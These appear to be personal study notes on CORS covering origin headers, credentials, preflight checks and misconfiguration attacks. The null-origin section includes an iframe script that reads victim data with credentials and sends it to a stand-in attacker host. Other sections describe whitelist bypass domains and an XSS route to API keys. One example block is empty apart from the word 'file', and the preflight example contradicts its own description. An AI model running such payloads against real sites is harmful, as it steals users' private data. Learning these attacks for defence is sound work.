- browser mechanism that enables controlled access to resources located outside of a given domain
	- adds flexibility to the same-origin policy 
- **CORS enables servers to define who can access their assets** and **which HTTP request methods are permitted** from external sources.
- potential for cross-domain attacks
# Same-Origin Policy 
- **server requesting** a resource and the server hosting the **resource** must share from the same protocol, domain name and port 
	![[Screenshot 2024-05-29 at 9.57.18 AM.png]]
# `Access-Control-Allow-Origin` Header
- identifies the permitted origin of the request
1. following cross-domain request from `normal-website.com`
	```
	GET /data HTTP/1.1
	Host: robust-website.com
	Origin : https://normal-website.com
	```
2. the server on `robust-website.com` returns the following response:
	```
	HTTP/1.1 200 OK
	...
	Access-Control-Allow-Origin: https://normal-website.com
	```
- cannot use the wildcard `*` with cross-origin transfer of credentials
# `Access-Control-Allow-Credentials` Header
- cross-domain server can permit reading of the response when credentials are passed to it by setting `Access-Control-Allow-Credentials` header to `true`
	- credentials can be cookies, `Authorization` headers etc.
1. if cookies sent with the request:
	```
	GET /data HTTP/1.1
	Host: robust-website.com
	...
	Origin: https://normal-website.com
	Cookie: JSESSIONID=<value>
	```
2. and the response to the request is:
	```
	HTTP/1.1 200 OK
	...
	Access-Control-Allow-Origin: https://normal-website.com
	Access-Control-Allow-Credentials: true
	```
browser will permit the requesting website to read the response as the header is set to `true`
# Pre-Flight Checks
- was added to the CORS specification to protect legacy resources from the expanded request options allowed by CORS
- when initiating a cross-domain request under specific conditions, such as using a **non-standard HTTP method** (anything other than HEAD, GET, POST), introducing new **headers**, or employing a special **Content-Type header value**, a pre-flight request may be required which leverages the `OPTIONS` method
consider the following illustration of a pre-flight request aimed at employing the `PUT` method along with a custom header named `Special-Request-Header`:
```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```
in response, the server might return headers indicating the accepted methods, the allowed origin, and other CORS policy details, as shown below:
```
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
# Vulnerabilities Arising From CORS Configuration Issues
## Server-Generated ACAO Header From Client-Specified Origin Header
- some applications take the easy route of effectively allowing access to any other domain
	- one way this is done is my reading the `Origin` header from requests and reflecting in the ACAO header which indicates that the requesting origin is allowed
1. if an application receives the following request:
```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```
2. it then responds with:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```
- the response indicates that access is allowed from the requesting domain (`malicious-website.com`) and that the cross-origin request can include credentials, so it will be processed
- this means that any domain can access resources from the vulnerable domain - if the response contains sensitive information (API key or CSRF token), can retrieve by placing the following script in your website:
```html
file
```
Lab: [[CORS vulnerability with basic origin reflection]]
# Error Parsing Origin Headers
- some applications use a whitelist of allowed origins 
	- when a CORS request is received, the supplied origin is compared to the whitelist 
	- if the origin appears in the whitelist it is reflected in the ACAO header
- can have misconfigurations in whitelists
- for example, suppose an application grants access to all domains ending in:
	`normal-website.com`
- an attacker might be able to gain access by registering the domain:
	`hackersnormal-website.com`
- alternatively, suppose an application grants access to all domains beginning with
	`normal-website.com`
- an attacker might be able to gain access using the domain:
	`normal-website.com.evil-user.net`
## Whitelisted `null` Origin Value
1. some applications might whitelist the null origin to support local development of the application. For example, suppose an application receives the following cross-origin request:
	```
	GET /sensitive-victim-data
	Host: vulnerable-website.com
	Origin: null
	```
2. and the server responds with:
	```
	HTTP/1.1 200 OK
	Access-Control-Allow-Origin: null
	Access-Control-Allow-Credentials: true
	```
3. attacker can generate various tricks to generate CORS containing `null`
	- can use `iframe`:
		```html
		<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
		var req = new XMLHttpRequest();
		req.onload = reqListener;
		req.open('get','vulnerable-website.com/sensitive-victim-data',true);
		req.withCredentials = true;
		req.send();
		
		function reqListener() {
		location='malicious-website.com/log?key='+this.responseText;
		};
		</script>"></iframe>
		```
		- the above script generates a `null` origin header to allow the request to go through
# Exploiting XSS Via CORS Trust Relationships
- if website trusts origin that is vulnerable to XSS, then attacker can exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive info 
1. given the following request:
	```
	GET /api/requestApiKey HTTP/1.1
	Host: vulnerable-website.com
	Origin: https://subdomain.vulnerable-website.com
	Cookie: sessionid=...
	```
2. if the server responds with:
	```
	HTTP/1.1 200 OK
	Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
	Access-Control-Allow-Credentials: true
	```
3. then an attacker who finds an XSS vulnerability on subdomain.vulnerable-website.com could use that to retrieve the API key, using a URL like:
	`https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`
	![[Screenshot 2024-05-29 at 6.09.46 PM.png]]
# Breaking TLS With Poorly Configured CORS 
	![[Screenshot 2024-05-29 at 6.09.25 PM.png]]
